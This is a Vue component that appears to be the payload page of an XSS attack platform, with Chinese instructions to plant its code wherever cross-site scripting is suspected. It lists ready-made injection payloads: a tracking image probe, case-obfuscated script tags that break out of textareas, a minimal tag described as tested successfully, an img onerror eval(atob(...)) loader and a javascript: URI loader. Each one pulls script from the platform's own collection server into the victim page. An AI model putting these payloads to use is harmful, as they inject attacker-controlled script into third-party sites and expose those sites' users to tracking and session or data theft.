<template>
  <div>
    <div>
      <div>图片探针（记录referer、IP、浏览器等信息）</div>
      <pre class="code">{{protocol}}//{{base_url}}/{{current_project.url_key}}.jpg</pre>
    </div>
    <div>
      <div>将如下代码植入怀疑出现xss的地方（注意'的转义).</div>
      <pre class="code">&lt;/tExtArEa&gt;'"&gt;&lt;sCRiPt sRC={{protocol}}//{{base_url}}/{{current_project.url_key}}&gt;&lt;/sCrIpT&gt;</pre>
    </div>
    <div>
      <div>或者</div>
      <pre class="code">&lt;sCRiPt sRC={{protocol}}//{{base_url}}/{{current_project.url_key}}&gt;&lt;/sCrIpT&gt;</pre>
    </div>
    <div>
      再或者以你任何想要的方式插入
      <pre class="code">{{protocol}}//{{base_url}}/{{current_project.url_key}}</pre>
    </div>
    <div>
      再或者以https,http双支持的方式插入
      <pre class="code">&lt;script src=//{{base_url}}/{{current_project.url_key}}&gt;&lt;/script&gt;</pre>
    </div>
    <div>
      ↓↓↓！~极限代码~！(可以不加最后的>回收符号，下面代码已测试成功)↓↓↓
      <pre class="code">&lt;sCRiPt/SrC=//{{base_url}}/{{current_project.url_key}}&gt;</pre>
    </div>
    <div>
      再或者以你任何想要的方式插入
      <pre class="code">&lt;img src=x onerror=eval(atob('{:base64_encode("s=createElement('script');body.appendChild(s);s.src='http://{{base_url}}/{{current_project.url_key}}?'+Math.random()")}'))&gt;</pre>
    </div>
    <div>
      再或者以https,http双支持的方式插入
      <pre class="code">javascript:eval('window.s=document.createElement("script");window.s.src="//{{base_url}}/{{current_project.url_key}}";document.body.appendChild(window.s)')</pre>
    </div>
  </div>
</template>

<script>
export default {
  props: ["current_project"],
  data: () => {
    return {
      base_url: "",
      protocol: ""
    };
  },
  mounted() {
    this.base_url = document.domain;
    this.protocol = window.location.protocol;
  }
};
</script>

<style scoped>
.code {
  color: #52a609;
  background: #081101;
  border-color: #214204;
  padding: 10px;
  margin: 10px;
  border-radius: 5px;
  overflow: scroll;
}
</style>